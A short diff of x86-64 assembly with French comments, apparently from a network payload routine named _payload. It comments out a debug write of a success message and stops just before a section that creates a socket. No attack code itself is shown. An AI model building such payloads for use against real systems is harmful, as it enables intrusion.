@@ -55,12 +55,12 @@ _payload:
 	cmp rax, -1
 	je .clean
 
-	; Affichage de succès (utilisation de write)
-    mov rax, 1                   ; numéro de syscall pour write
-    mov rdi, 1                   ; descripteur de fichier (stdout)
-    lea rsi, [rel STATBUFFER]   ; message de succès
-    mov rdx, 144     ; longueur du message
-    syscall
+	; ; Affichage de succès (utilisation de write)
+    ; mov rax, 1                   ; numéro de syscall pour write
+    ; mov rdi, 1                   ; descripteur de fichier (stdout)
+    ; lea rsi, [rel STATBUFFER]   ; message de succès
+    ; mov rdx, 144     ; longueur du message
+    ; syscall
 
 .connect:
 	; Create the socket
